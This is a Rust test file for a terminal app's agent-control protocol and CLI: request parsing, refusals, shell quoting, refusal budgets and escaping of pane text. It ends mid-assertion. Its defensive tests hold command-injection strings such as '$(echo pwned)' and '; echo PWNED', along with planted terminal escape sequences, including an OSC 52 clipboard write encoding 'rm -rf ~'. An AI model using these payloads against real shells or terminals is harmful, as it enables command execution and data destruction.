//! The window answering, tested where each part can be reached: the wire with
//! no connection, a connection with no window, the window with no display —
//! and all of it at once, a real socket asked by the real command line about
//! a real workspace.

use std::cell::Cell;
use std::path::{Path, PathBuf};
use std::rc::Rc;
use std::sync::Arc;
use std::time::{Duration, Instant};

use crookui_core::executor::{Background, LocalQueue};
use crookui_core::fonts::FamilyId;
use crookui_core::{App, ViewHandle};
use serde_json::{Value, json};

use super::protocol::{self, NewTab, PaneEntry, Reply, Request, Verb, code};
use super::*;
use crate::Channel;
use crate::agent::request::AskRequest;
use crate::git::{GitFacts, Head};
use crate::settings::Settings;
use crate::tab::{AgentStatus, Attention, Direction, Tab, TabAction};
use crate::terminal_font::{CELL_FONT_SIZE, CellFont};
use crate::window_controls::Recorder;
use crate::workspace::{Fonts, Opening};

/// Two panes as a window would describe them: one focused and working, one
/// waiting on a question, in a group.
fn two_panes() -> Vec<PaneEntry> {
    vec![
        PaneEntry {
            pane_id: 3,
            tab_id: 2,
            title: "port the tab bar".to_owned(),
            tab_title: "port the tab bar".to_owned(),
            group: None,
            focused: true,
            status: "running".to_owned(),
            message: None,
            cwd: Some("/home/someone/work/crook".to_owned()),
            branch: Some("main".to_owned()),
            asking: false,
        },
        PaneEntry {
            pane_id: 7,
            tab_id: 5,
            title: "sandbox the host".to_owned(),
            tab_title: "sandbox the host".to_owned(),
            group: Some("atlas".to_owned()),
            focused: false,
            status: "needs-input".to_owned(),
            message: Some("run rm -rf build?".to_owned()),
            cwd: None,
            branch: None,
            asking: false,
        },
    ]
}

/// The verb a line asks for, and the code of the refusal when it asks for
/// none.
fn verdict(line: &str) -> (Option<Value>, Result<Verb, String>) {
    let (id, request) = protocol::read(line.as_bytes());
    (
        id,
        request
            .map(|request| request.verb)
            .map_err(|refusal| refusal.code),
    )
}

/// A `pane.list` from nobody in particular.
fn listing() -> Request {
    Request {
        verb: Verb::PaneList,
        token: None,
        asker: None,
    }
}

#[test]
fn a_request_and_its_answer_come_back_off_the_wire_as_they_went_on() {
    let line = protocol::request_line(&Verb::PaneList, None);
    assert!(line.ends_with('\n') && line.matches('\n').count() == 1);
    assert_eq!(verdict(line.trim_end()), (None, Ok(Verb::PaneList)));
    // Whatever the request called itself comes back with the answer, so a
    // client with several in flight can tell them apart.
    assert_eq!(
        verdict(r#"{"v":1,"id":{"n":7},"verb":"pane.list"}"#),
        (Some(json!({"n": 7})), Ok(Verb::PaneList))
    );

    let panes = two_panes();
    let reply = Reply::answered(
        Some(json!(7)),
        serde_json::to_value(&panes).expect("encodes"),
    );
    let line = reply.line();
    assert!(
        line.ends_with('\n') && line.matches('\n').count() == 1,
        "a reply is one line: {line:?}"
    );
    let read: Reply = serde_json::from_str(&line).expect("a reply reads back");
    assert_eq!(read, reply);
    assert_eq!(read.v, protocol::VERSION, "every reply says its version");
    let listed: Vec<PaneEntry> =
        serde_json::from_value(read.result.expect("an answer")).expect("a list of panes");
    assert_eq!(listed, panes);

    let refused = Reply::refused(None, Refusal::new(code::GONE, "closed"));
    let read: Value = serde_json::from_str(&refused.line()).expect("reads back");
    assert_eq!(
        read,
        json!({"v": protocol::VERSION, "ok": false, "error": {"code": "gone", "message": "closed"}}),
        "a refusal carries the version too, and nothing it has no value for"
    );
}

#[test]
fn a_verb_this_window_does_not_know_is_refused_by_name() {
    let (id, verb) = protocol::read(br#"{"v":1,"id":"a","verb":"pane.frobnicate"}"#);
    assert_eq!(
        id,
        Some(json!("a")),
        "a refusal is matched to its request too"
    );
    let refusal = verb.expect_err("not a verb");
    assert_eq!(refusal.code, code::UNKNOWN_VERB);
    assert!(
        refusal.message.contains("pane.frobnicate"),
        "the refusal names what was asked: {}",
        refusal.message
    );
    assert_eq!(
        Verb::NAMES,
        [
            "pane.list",
            "tab.new",
            "pane.wait",
            "pane.blocks",
            "events.follow",
            "agent.ask",
            "pane.find"
        ]
    );
    for name in Verb::NAMES {
        assert!(
            refusal.message.contains(name),
            "and every verb there is, {name} among them: {}",
            refusal.message
        );
    }
}

#[test]
fn a_request_that_is_not_one_is_refused_with_what_one_looks_like() {
    for line in [
        "pane.list",
        "[1, 2]",
        r#"{"verb":"pane.list"}"#,
        r#"{"v":"1","verb":"pane.list"}"#,
        r#"{"v":1}"#,
        r#"{"v":1,"verb":7}"#,
        r#"{"v":1,"min_version":"one","verb":"pane.list"}"#,
    ] {
        let (_, verb) = protocol::read(line.as_bytes());
        let refusal = verb.expect_err(line);
        assert_eq!(refusal.code, code::BAD_REQUEST, "{line}");
        assert!(
            refusal.message.contains(r#"{"v":1,"verb":"pane.list"}"#),
            "{line}: the refusal shows a request that works: {}",
            refusal.message
        );
    }
}

#[test]
fn a_request_the_versions_cannot_agree_on_is_refused_as_a_version() {
    assert_eq!(
        verdict(r#"{"v":0,"verb":"pane.list"}"#).1,
        Err(code::VERSION.to_owned()),
        "older than the oldest this window answers"
    );
    let (_, needs_more) = protocol::read(br#"{"v":1,"min_version":2,"verb":"pane.list"}"#);
    let refusal = needs_more.expect_err("this window is version 1");
    assert_eq!(refusal.code, code::VERSION);
    assert!(
        refusal.message.contains("update Crook"),
        "{}",
        refusal.message
    );

    // Versions add: a request written for a later one still means what it
    // says here, unless it says it needs the later one.
    assert_eq!(
        verdict(r#"{"v":2,"verb":"pane.list"}"#).1,
        Ok(Verb::PaneList)
    );
    assert_eq!(
        verdict(r#"{"v":1,"min_version":1,"verb":"pane.list"}"#).1,
        Ok(Verb::PaneList)
    );
}

#[test]
fn crook_pane_takes_list_and_json_and_refuses_anything_else() {
    let arguments = |words: &[&str]| {
        cli::pane_arguments(words.iter().map(|word| (*word).to_owned()))
            .map_err(|error| error.to_string())
    };
    assert_eq!(
        arguments(&["list"]),
        Ok(cli::PaneCommand::List { json: false })
    );
    assert_eq!(
        arguments(&["list", "--json"]),
        Ok(cli::PaneCommand::List { json: true })
    );
    for (words, said) in [
        (&[][..], "needs a verb"),
        (&["lsit"][..], "takes list, wait or blocks, not lsit"),
        (&["list", "--json", "--json"][..], "given twice"),
        (&["list", "--tsv"][..], "unrecognised argument --tsv"),
    ] {
        let refusal = arguments(words).expect_err("refused");
        assert!(refusal.contains(said), "{words:?}: {refusal}");
    }
}

/// A `tab.new` of `words`, and nothing else.
fn new_tab(words: &[&str]) -> NewTab {
    NewTab {
        command: words.iter().map(|word| (*word).to_owned()).collect(),
        ..NewTab::default()
    }
}

#[test]
fn a_new_tab_request_carries_its_command_words_and_the_panes_token_off_the_wire() {
    let asked = NewTab {
        command: vec!["claude".to_owned(), "fix the \"flaky\" test".to_owned()],
        worktree: Some("fix-x".to_owned()),
        in_my_group: true,
        title: Some("fix x".to_owned()),
    };
    let line = protocol::request_line(&Verb::TabNew(asked.clone()), Some("5ec2e7"));
    assert!(line.ends_with('\n') && line.matches('\n').count() == 1);
    let (_, request) = protocol::read(line.trim_end().as_bytes());
    assert_eq!(
        request,
        Ok(Request {
            verb: Verb::TabNew(asked),
            token: Some("5ec2e7".to_owned()),
            asker: None,
        })
    );

    // What is left out is what the window assumes: no worktree, no group, no
    // title, and no token — which is a request from nobody.
    let (_, bare) = protocol::read(br#"{"v":1,"verb":"tab.new","args":{"command":["make"]}}"#);
    assert_eq!(
        bare,
        Ok(Request {
            verb: Verb::TabNew(new_tab(&["make"])),
            token: None,
            asker: None,
        })
    );
    // A listing may carry a token too, and it changes nothing about it.
    let (_, listing) = protocol::read(br#"{"v":1,"verb":"pane.list","token":"5ec2e7"}"#);
    assert_eq!(listing.map(|request| request.verb), Ok(Verb::PaneList));
}

#[test]
fn a_new_tab_argument_this_window_does_not_know_is_refused_rather_than_ignored() {
    // Ignoring one could open an agent somewhere nobody asked: a `worktree`
    // spelled some other way, dropped, would put it in the caller's checkout.
    for (line, said) in [
        (
            r#"{"v":1,"verb":"tab.new","args":{"command":["make"],"branch":"fix-x"}}"#,
            "branch",
        ),
        (r#"{"v":1,"verb":"tab.new"}"#, "command"),
        (
            r#"{"v":1,"verb":"tab.new","args":{"command":"make"}}"#,
            "args",
        ),
        (
            r#"{"v":1,"verb":"pane.list","args":{"all":true}}"#,
            "no `args`",
        ),
        (r#"{"v":1,"verb":"pane.list","token":7}"#, "token"),
    ] {
        let (_, request) = protocol::read(line.as_bytes());
        let refusal = request.expect_err(line);
        assert_eq!(refusal.code, code::BAD_REQUEST, "{line}");
        assert!(
            refusal.message.contains(said),
            "{line}: {}",
            refusal.message
        );
    }
    let (_, unknown) = protocol::read(br#"{"v":1,"verb":"tab.frobnicate"}"#);
    let refusal = unknown.expect_err("not a verb");
    assert!(
        refusal.message.contains("pane.list") && refusal.message.contains("tab.new"),
        "the refusal names every verb there is: {}",
        refusal.message
    );
}

#[test]
fn crook_tab_new_takes_its_flags_before_the_separator_and_the_command_after_it() {
    let arguments = |words: &[&str]| {
        cli::tab_arguments(words.iter().map(|word| (*word).to_owned()))
            .map_err(|error| error.to_string())
    };
    assert_eq!(
        arguments(&["new", "--", "make", "test"]),
        Ok((new_tab(&["make", "test"]), false))
    );
    // Everything after `--` is the command's, flags and all: `--resume` is
    // claude's, and `--json` there is a word of the command, not this one's.
    assert_eq!(
        arguments(&[
            "new",
            "--worktree",
            "fix-x",
            "--in-my-group",
            "--title",
            "fix x",
            "--json",
            "--",
            "claude",
            "--resume",
            "--json",
        ]),
        Ok((
            NewTab {
                command: vec!["claude".into(), "--resume".into(), "--json".into()],
                worktree: Some("fix-x".into()),
                in_my_group: true,
                title: Some("fix x".into()),
            },
            true
        ))
    );
    for (words, said) in [
        (&[][..], "needs a verb"),
        (&["open", "--", "make"][..], "takes new, not open"),
        (&["new"][..], "needs a command after `--`"),
        (&["new", "--"][..], "needs a command after `--`"),
        (&["new", "make"][..], "the command goes after `--`"),
        (&["new", "--worktree"][..], "`--worktree` needs a value"),
        (
            &["new", "--json", "--json", "--", "make"][..],
            "given twice",
        ),
        (
            &["new", "--in-my-group", "--in-my-group", "--", "make"][..],
            "given twice",
        ),
    ] {
        let refusal = arguments(words).expect_err("refused");
        assert!(refusal.contains(said), "{words:?}: {refusal}");
    }
}

#[test]
fn a_command_is_refused_for_a_shell_its_quoting_is_not_proven_in_and_for_a_control_character() {
    let words = |words: &[&str]| {
        words
            .iter()
            .map(|word| (*word).to_owned())
            .collect::<Vec<_>>()
    };
    let refused = |words: &[String], shell: &str| {
        spawn::command_line(words, Path::new(shell))
            .expect_err("refused")
            .code
    };
    for shell in [
        "/usr/bin/nu",
        "/usr/bin/pwsh",
        "/usr/bin/xonsh",
        "/usr/local/bin/elvish",
    ] {
        assert_eq!(
            refused(&words(&["make"]), shell),
            code::UNSUPPORTED_SHELL,
            "{shell} reads single quotes its own way, or has not been asked"
        );
    }
    // A newline ends a command line, and what came after it would be a
    // second command nobody typed as one.
    assert_eq!(
        refused(&words(&["echo", "one\necho two"]), "/bin/bash"),
        code::BAD_REQUEST
    );
    assert_eq!(
        refused(&words(&["echo", "\u{1b}[2J"]), "/bin/bash"),
        code::BAD_REQUEST
    );
    assert_eq!(refused(&[], "/bin/bash"), code::BAD_REQUEST);
}

#[test]
fn a_prompt_with_lines_is_refused_with_the_way_round_it() {
    // A brief with its lines — a task, then what done looks like — is the
    // prompt a lead most often hands a worker. A refusal that said only why
    // left it to flatten the brief or to ask again blind, every try counting
    // toward the stop, so it says what to do instead: name a file that holds
    // the brief, by a path the worker can open from its own worktree. And
    // let it open it: Claude Code in a `--worktree` tab asks before reading
    // the lead's directory, and `claude -p` there is refused the read, so an
    // example with no rule for the brief was a worker that never saw it.
    // Only the brief, though: `--add-dir "$PWD"` made the lead's checkout a
    // working directory of the worker's, which it may write to as well, and
    // under acceptEdits without asking — the isolation `--worktree` is for.
    let refusal = spawn::command_line(
        &[
            "claude".to_owned(),
            "Task: fix the flaky test\n\tDone when: it passes".to_owned(),
        ],
        Path::new("/bin/bash"),
    )
    .expect_err("a newline is a second command");
    assert_eq!(refusal.code, code::BAD_REQUEST);
    for said in [
        "newline",
        "one line",
        "file",
        "$PWD/task.md",
        "--allowedTools \"Read(/$PWD/task.md)\" --",
    ] {
        assert!(
            refusal.message.contains(said),
            "the refusal does not say {said:?}: {}",
            refusal.message
        );
    }
    assert!(
        !refusal.message.contains("--add-dir"),
        "the refusal gives the worker the lead's checkout to write in: {}",
        refusal.message
    );
}

#[cfg(unix)]
#[test]
fn a_command_arrives_in_every_shell_as_the_words_it_was_given() {
    // The plugin host's own proof, for the line `tab new` types: a real shell
    // reads the line and prints the words it read, one to a line. Every shell
    // a pane can run that is on this machine, since they do not agree about
    // single quotes.
    //
    // Every word that would do something unquoted does something harmless:
    // this line is run for real, and a quoting that broke would run it.
    let given: Vec<String> = [
        "printf",
        "%s\\n",
        "it's here",
        "\"double\" quotes",
        "$(echo pwned)",
        "`id`",
        "$HOME",
        "a\\b",
        "x\\' ; echo PWNED ; echo \\'",
        "*",
        "~",
        "",
        "; echo pwned",
        "if",
        "--flag",
    ]
    .iter()
    .map(|word| (*word).to_owned())
    .collect();
    for (shell, flags) in [
        ("sh", &["-c"][..]),
        ("bash", &["-c"][..]),
        ("zsh", &["-f", "-c"][..]),
        ("fish", &["--no-config", "-c"][..]),
    ] {
        let line = spawn::command_line(&given, Path::new(shell)).expect("a proven shell");
        let Ok(output) = crate::process::command(shell)
            .args(flags)
            .arg(&line)
            .output()
        else {
            // Not on this machine.
            continue;
        };
        let read = String::from_utf8_lossy(&output.stdout);
        let expected: String = given[2..].iter().map(|word| format!("{word}\n")).collect();
        assert_eq!(
            read, expected,
            "{shell}: {line:?} did not come back word for word"
        );
    }
}

/// A worker `tab new` opens runs the line it typed, every word quoted, and
/// that line is what the pane's command is read off: the agent in it is the
/// one the words started, in every shell the line is typed into.
#[cfg(unix)]
#[test]
fn the_line_tab_new_types_names_the_agent_it_starts() {
    for agent in ["claude", "codex", "gemini", "/opt/my tools/codex"] {
        let words = [agent.to_owned(), "fix the \"flaky\" test".to_owned()];
        for shell in ["sh", "bash", "zsh", "fish"] {
            let line = spawn::command_line(&words, Path::new(shell)).expect("a proven shell");
            let named = agent.rsplit('/').next();
            assert_eq!(crate::agent::program_of(&line), named, "{shell}: {line}");
        }
    }
}

#[test]
fn sixteen_refusals_in_a_row_stop_the_window_answering_that_pane_and_no_other() {
    let refusal = Refusal::new(code::BUDGET, "full");
    let (pane, other) = (crate::tab::PaneId::next(), crate::tab::PaneId::next());
    let mut spawns = spawn::Spawns::default();

    for _ in 1..spawn::REFUSALS_ALLOWED {
        spawns.refuse(pane, &refusal);
    }
    assert!(!spawns.stopped(pane), "one short of the bound");
    // A request agreed to is not yet a tab: git can still refuse its
    // worktree, and that refusal is the next in the same run.
    spawns.accept(pane);
    assert!(!spawns.stopped(pane));
    spawns.refuse(pane, &refusal);
    assert!(
        spawns.stopped(pane),
        "a request agreed to and then refused started the count again"
    );

    // A tab that opens starts the count again: a pane nobody refused since
    // is in the ordinary state, not a bad one.
    let pane = crate::tab::PaneId::next();
    for _ in 1..spawn::REFUSALS_ALLOWED {
        spawns.refuse(pane, &refusal);
    }
    spawns.opened(pane);
    for _ in 1..spawn::REFUSALS_ALLOWED {
        spawns.refuse(pane, &refusal);
    }
    assert!(
        !spawns.stopped(pane),
        "the count began again at the tab that opened"
    );

    spawns.refuse(pane, &refusal);
    assert!(spawns.stopped(pane), "sixteen in a row");
    // A tab agreed to before the stop may still open after it; that is not
    // the pane in the ordinary state again.
    spawns.opened(pane);
    assert!(
        spawns.stopped(pane),
        "a tab opening after the stop answered the pane again"
    );
    assert!(
        !spawns.stopped(other),
        "a loop in one pane costs no other pane anything"
    );
}

#[test]
fn the_table_marks_the_focused_pane_and_puts_a_question_under_its_title() {
    let table = cli::table(&two_panes(), Some(Path::new("/home/someone")));
    let lines: Vec<&str> = table.lines().collect();
    assert_eq!(
        lines.len(),
        4,
        "a heading, two rows and one question:\n{table}"
    );
    assert!(lines[0].starts_with("PANE  STATUS"), "{table}");
    assert!(
        lines[1].starts_with("3*"),
        "the focused pane is marked:\n{table}"
    );
    assert!(lines[1].ends_with("~/work/crook"), "{table}");
    assert!(lines[2].starts_with("7 "), "and no other:\n{table}");
    assert!(lines[2].contains("atlas"), "{table}");

    let title = lines[2]
        .find("sandbox the host")
        .expect("the row has its title");
    assert_eq!(
        lines[3].find("run rm -rf build?"),
        Some(title),
        "the question sits under the title it belongs to:\n{table}"
    );
    assert!(
        lines.iter().all(|line| line.trim_end() == *line),
        "no line trails spaces:\n{table}"
    );
}

#[test]
fn the_table_lines_up_a_title_drawn_in_wide_characters() {
    // Four characters, eight columns: the cells after it still start under
    // their headings.
    let mut panes = two_panes();
    panes[0].title = "修正バグ".to_owned();
    let table = cli::table(&panes, Some(Path::new("/home/someone")));
    let lines: Vec<&str> = table.lines().collect();

    let column_of = |line: &str, text: &str| {
        let at = line.find(text).expect("the text is on the line");
        unicode_width::UnicodeWidthStr::width(&line[..at])
    };
    assert_eq!(
        column_of(lines[1], "main"),
        column_of(lines[0], "BRANCH"),
        "the branch is under its heading:\n{table}"
    );
}

/// Every control character a pane could have planted in what the window
/// says about it: a retitle and a line erase over OSC 7's percent-decoding, a
/// C1 CSI, a carriage return, a newline, and a DEL.
fn planted() -> Vec<PaneEntry> {
    let mut panes = two_panes();
    panes[0].cwd = Some("/tmp/\u{1b}]2;approved\u{7}".to_owned());
    panes[0].title = "\u{1b}]52;c;cm0gLXJmIH4=\u{7}".to_owned();
    panes[0].branch = Some("main\r".to_owned());
    panes[1].group = Some("atlas\u{9b}2J".to_owned());
    panes[1].message = Some("run\u{1b}[1A\u{1b}[2K this?\nyes\u{7f}".to_owned());
    panes
}

#[test]
fn the_table_writes_out_what_a_pane_planted_in_it_rather_than_sending_it_to_the_terminal() {
    let table = cli::table(&planted(), None);
    assert!(
        !table
            .chars()
            .any(|character| character.is_control() && character != '\n'),
        "the terminal `crook pane list` runs in is sent no control character: {table:?}"
    );
    assert_eq!(
        table.lines().count(),
        4,
        "a newline in a message is not a row of its own:\n{table}"
    );
    // Written out rather than dropped: what the pane tried is on the screen
    // for the person reading it.
    for written in [
        r"/tmp/\u{1b}]2;approved\u{7}",
        r"\u{9b}2J",
        r"\r",
        r"\n",
        r"\u{7f}",
    ] {
        assert!(table.contains(written), "{written}:\n{table}");
    }
}

#[test]
fn the_json_escapes_every_control_character_and_still_reads_back_as_what_the_window_sent() {
    let sent = serde_json::to_value(planted()).expect("encodes");
    let json = cli::json(&sent);
    assert!(
        !json
            .chars()
            .any(|character| character.is_control() && character != '\n'),
        "not even the C1 and DEL a JSON encoder leaves as they are: {json:?}"
    );
    let read: Value = serde_json::from_str(&json).expect("still JSON");
    assert_eq!(read, sent, "and still the same value");
}

/// A window with no display, carrying nothing but the tab strip.
struct Window {
    /// The queue standing in for the event loop, which only a test with a
    /// socket in front of the window has to pump: everything else reads the
    /// strip straight off the workspace. The app's foreground holds it too,
    /// so leaving it out elsewhere drops nothing it needs.
    #[cfg(unix)]
    queue: Arc<LocalQueue>,
    app: App,
    workspace: ViewHandle<Workspace>,
}

impl Window {
    fn new() -> Self {
        let queue = LocalQueue::new();
        let mut app = App::new(queue.foreground(), Arc::new(Background::new(2)));
        let quits = Rc::new(Cell::new(0));
        let quit: crate::workspace::QuitRequest = Rc::new(move || quits.set(quits.get() + 1));
        let fonts = Fonts {
            ui: FamilyId(0),
            monospace: FamilyId(0),
        };
        // No plugins: what `pane.list` answers is the strip's, and nothing a
        // plugin draws is in it.
        let (_, workspace) = app.add_window(|ctx| {
            Workspace::new(
                fonts,
                CellFont::headless(CELL_FONT_SIZE),
                Opening {
                    settings: Settings::ephemeral(),
                    channel: Channel::Dev,
                    plugins: Vec::new(),
                    withdrawn: Default::default(),
                    heard: Default::default(),
                    plugins_directory: None,
                },
                quit,
                Rc::new(Recorder::default()),
                ctx,
            )
        });
        Self {
            #[cfg(unix)]
            queue,
            app,
            workspace,
        }
    }

    /// What `pane.list` would answer now.
    fn panes(&self) -> Vec<PaneEntry> {
        self.workspace.read(&self.app, panes)
    }
}

/// A window with three tabs: the first split in two, a second on its own,
/// and a third opened into a group with the first — which puts it beside the
/// first, ahead of the second — and every pane saying something different.
///
/// Returns the window and the pane numbers in the panel's order.
fn busy_window() -> (Window, Vec<u64>) {
    let mut window = Window::new();
    window.workspace.update(&mut window.app, |workspace, ctx| {
        let first = workspace.tabs().iter().map(Tab::id).next().expect("a tab");
        let left = workspace.tabs().focused_pane_id().expect("a pane");
        workspace.apply(TabAction::Split(Direction::Right), ctx);
        let right = workspace.tabs().focused_pane_id().expect("a pane");
        workspace.apply(TabAction::New, ctx);
        let alone = workspace.tabs().focused_pane_id().expect("a pane");
        workspace.apply(TabAction::NewInGroupOf(first), ctx);
        let grouped = workspace.tabs().focused_pane_id().expect("a pane");

        let checkout = PathBuf::from("/work/crook");
        workspace.update_session(left, ctx, |session| {
            session.derived_title = Some("port the tab bar".to_owned());
            session.status = AgentStatus::Running;
            session.working_directory = Some(checkout.clone());
        });
        workspace.update_session(right, ctx, |session| {
            session.custom_title = Some("the tests".to_owned());
            session.status = AgentStatus::NeedsInput;
            session.message = Some("run rm -rf build?".to_owned());
            session.working_directory = Some(PathBuf::from("/work/elsewhere"));
        });
        // The bell rang there while nobody was looking: the row's dot says
        // needs input, and the agent has said nothing.
        workspace.update_session(alone, ctx, |session| {
            session.attention = Some(Attention::Bell);
        });
        workspace.update_session(grouped, ctx, |session| {
            session.status = AgentStatus::Failed;
            session.working_directory = Some(PathBuf::from("/work/crook-atlas"));
        });
        workspace.git().update(ctx, |model, ctx| {
            model.record(
                checkout,
                GitFacts {
                    branch: Some(Head::Branch("main".to_owned())),
                    diff: None,
                    since_base: None,
                    worktree: false,
                },
                ctx,
            )
        });
    });
    let ids = window.workspace.read(&window.app, |workspace, _| {
        workspace
            .tabs()
            .panes()
            .map(|(_, pane)| pane.id().as_u64())
            .collect()
    });
    (window, ids)
}

#[test]
fn pane_list_names_every_pane_by_the_number_its_shell_was_given() {
    let (window, ids) = busy_window();
    let panes = window.panes();

    // The number `CROOK_PANE_ID` carries, in the panel's order, and every
    // pane of a split rather than one a tab.
    assert_eq!(
        panes.iter().map(|pane| pane.pane_id).collect::<Vec<_>>(),
        ids,
        "{panes:#?}"
    );
    assert_eq!(ids.len(), 4);
    let focused = window
        .workspace
        .read(&window.app, |workspace, _| {
            workspace.tabs().focused_pane_id()
        })
        .map(|pane| pane.as_u64());
    assert_eq!(
        panes
            .iter()
            .filter(|pane| pane.focused)
            .map(|pane| pane.pane_id)
            .collect::<Vec<_>>(),
        focused.into_iter().collect::<Vec<_>>(),
        "one pane is the one being worked in, and it is the window's focused one"
    );

    let [split_left, split_right, grouped, alone] = &panes[..] else {
        panic!("four panes: {panes:#?}");
    };
    assert_eq!(split_left.tab_id, split_right.tab_id, "one tab, split");
    assert_ne!(split_left.tab_id, alone.tab_id);

    assert_eq!(split_left.title, "port the tab bar");
    assert_eq!(split_left.status, "running");
    assert_eq!(split_left.cwd.as_deref(), Some("/work/crook"));
    assert_eq!(
        split_left.branch.as_deref(),
        Some("main"),
        "git has been asked there"
    );

    assert_eq!(split_right.title, "the tests");
    assert_eq!(
        split_right.status, "needs-input",
        "the word `crook --agent` takes"
    );
    assert_eq!(split_right.message.as_deref(), Some("run rm -rf build?"));
    assert_eq!(split_right.branch, None, "git has not been asked there");
    // The split's right half has the keyboard in that tab, so it is what a
    // row standing for the tab would say.
    assert_eq!(split_left.tab_title, "the tests");

    assert_eq!(grouped.status, "failed");
    assert_eq!(
        grouped.title, "crook-atlas",
        "a pane with no name of its own is called what its row calls it"
    );
    assert!(grouped.group.is_some(), "opened into a group: {grouped:#?}");
    assert_eq!(
        split_left.group, grouped.group,
        "the group it was opened into"
    );
    assert_eq!(alone.group, None);
    assert_eq!(
        alone.status, "idle",
        "the status is what the agent said, not the dot a bell turned amber"
    );
}

#[test]
fn a_question_to_a_window_that_has_closed_is_refused_as_gone_at_once() {
    let inbox = Arc::new(Inbox::default());
    let asking = inbox.clone();
    let started = Instant::now();
    let asked = std::thread::spawn(move || {
        asking.ask(listing(), None, Instant::now() + Duration::from_secs(5))
    });
    std::thread::sleep(Duration::from_millis(50));
    inbox.close();
    let refusal = asked
        .join()
        .expect("the asking thread")
        .expect_err("nothing answered");
    assert_eq!(
        refusal.code,
        code::GONE,
        "a closed window says so rather than leaving the question to time out"
    );
    assert!(started.elapsed() < Duration::from_secs(4));

    // And one asked after it closed is refused before it is queued.
    let refusal = inbox
        .ask(listing(), None, Instant::now() + Duration::from_secs(5))
        .expect_err("closed");
    assert_eq!(refusal.code, code::GONE);
}

#[test]
fn a_question_nobody_answers_is_refused_as_a_timeout() {
    let inbox = Inbox::default();
    let refusal = inbox
        .ask(listing(), None, Instant::now() + Duration::from_millis(50))
        .expect_err("no window is serving this inbox");
    assert_eq!(refusal.code, code::TIMEOUT);
}

#[test]
fn a_wait_a_read_of_blocks_and_a_follow_come_back_off_the_wire_as_they_went_on() {
    let token = Some("c0ffee");
    for verb in [
        Verb::PaneWait(protocol::Wait {
            pane: 7,
            until: protocol::Until::NeedsInput,
            timeout: Some(600),
        }),
        Verb::PaneWait(protocol::Wait {
            pane: 7,
            until: protocol::Until::Finished,
            timeout: None,
        }),
        Verb::PaneBlocks(protocol::ReadBlocks {
            pane: 7,
            last: Some(1),
        }),
        Verb::EventsFollow(protocol::Follow { pane: None }),
        Verb::EventsFollow(protocol::Follow { pane: Some(7) }),
    ] {
        let line = protocol::request_line(&verb, token);
        let (_, request) = protocol::read(line.trim_end().as_bytes());
        let request = request.unwrap_or_else(|refusal| panic!("{line}: {refusal:?}"));
        assert_eq!(request.verb, verb, "{line}");
        assert_eq!(request.token.as_deref(), token);
    }

    for (line, said) in [
        (
            r#"{"v":1,"verb":"pane.wait"}"#,
            "needs `args` naming its `pane`",
        ),
        (
            r#"{"v":1,"verb":"pane.wait","args":{"pane":7,"until":"done"}}"#,
            "unknown variant",
        ),
        (
            r#"{"v":1,"verb":"pane.wait","args":{"pane":7,"until":"idle","timeout":3601}}"#,
            "at most 3600 seconds",
        ),
        (
            r#"{"v":1,"verb":"pane.wait","args":{"pane":7,"until":"idle","follow":true}}"#,
            "unknown field",
        ),
        (
            r#"{"v":1,"verb":"pane.blocks","args":{"pane":7,"last":0}}"#,
            "from 1 to 100",
        ),
        (
            r#"{"v":1,"verb":"pane.blocks","args":{"pane":7,"last":101}}"#,
            "from 1 to 100",
        ),
        (
            r#"{"v":1,"verb":"events.follow","args":{"panes":[7]}}"#,
            "unknown field",
        ),
    ] {
        let (_, request) = protocol::read(line.as_bytes());
        let refusal = request.expect_err(line);
        assert_eq!(refusal.code, code::BAD_REQUEST, "{line}");
        assert!(
            refusal.message.contains(said),
            "{line}: {}",
            refusal.message
        );
    }

    // Only a wait with time to wait, and a stream, keep their connection.
    let wait = |timeout| {
        Verb::PaneWait(protocol::Wait {
            pane: 7,
            until: protocol::Until::Idle,
            timeout,
        })
    };
    assert!(wait(Some(5)).keeps_connection());
    assert!(wait(None).keeps_connection());
    assert!(!wait(Some(0)).keeps_connection());
    assert!(Verb::EventsFollow(protocol::Follow::default()).keeps_connection());
    assert!(
        !Verb::PaneBlocks(protocol::ReadBlocks {
            pane: 7,
            last: None
        })
        .keeps_connection()
    );
    assert!(!Verb::PaneList.keeps_connection());
}

#[test]
fn crook_pane_wait_and_blocks_take_a_pane_and_their_flags_and_refuse_anything_else() {
    let arguments = |words: &[&str]| {
        cli::pane_arguments(words.iter().map(|word| (*word).to_owned()))
            .map_err(|error| error.to_string())
    };
    assert_eq!(
        arguments(&["wait", "7", "--until", "needs-input", "--timeout", "600"]),
        Ok(cli::PaneCommand::Wait {
            asked: protocol::Wait {
                pane: 7,
                until: protocol::Until::NeedsInput,
                timeout: Some(600),
            },
            json: false,
        })
    );
    // The pane among the flags is still the pane.
    assert_eq!(
        arguments(&["wait", "--json", "--until", "finished", "12"]),
        Ok(cli::PaneCommand::Wait {
            asked: protocol::Wait {
                pane: 12,
                until: protocol::Until::Finished,
                timeout: None,
            },
            json: true,
        })
    );
    assert_eq!(
        arguments(&["blocks", "7", "--last", "1", "--json"]),
        Ok(cli::PaneCommand::Blocks {
            asked: protocol::ReadBlocks {
                pane: 7,
                last: Some(1),
            },
            json: true,
        })
    );
    assert_eq!(
        arguments(&["blocks", "7"]),
        Ok(cli::PaneCommand::Blocks {
            asked: protocol::ReadBlocks {
                pane: 7,
                last: None
            },
            json: false,
        })
    );
    for (words, said) in [
        (&["wait", "--until", "idle"][..], "needs a pane"),
        (&["wait", "7"][..], "what to wait --until"),
        (
            &["wait", "7", "--until", "done"][..],
            "takes idle, needs-input, exited, finished, not done",
        ),
        (&["wait", "7", "--until"][..], "`--until` needs a value"),
        (
            &["wait", "7", "--until", "idle", "--timeout", "soon"][..],
            "whole number of seconds",
        ),
        (
            &["wait", "7", "8", "--until", "idle"][..],
            "one pane at a time",
        ),
        (&["wait", "seven", "--until", "idle"][..], "not seven"),
        (
            &["wait", "7", "--until", "idle", "--until", "idle"][..],
            "given twice",
        ),
        (
            &["wait", "7", "--until", "idle", "--forever"][..],
            "unrecognised argument --forever",
        ),
        (&["blocks"][..], "needs a pane"),
        (
            &["blocks", "7", "--last", "all"][..],
            "whole number of blocks",
        ),
        (
            &["blocks", "7", "--tail", "3"][..],
            "unrecognised argument --tail",
        ),
    ] {
        let refusal = arguments(words).expect_err("refused");
        assert!(refusal.contains(said), "{words:?}: {refusal}");
    }
}

#[test]
fn crook_events_needs_follow_and_takes_one_pane() {
    let arguments = |words: &[&str]| {
        cli::events_arguments(words.iter().map(|word| (*word).to_owned()))
            .map_err(|error| error.to_string())
    };
    assert_eq!(
        arguments(&["--follow"]),
        Ok(protocol::Follow { pane: None })
    );
    assert_eq!(
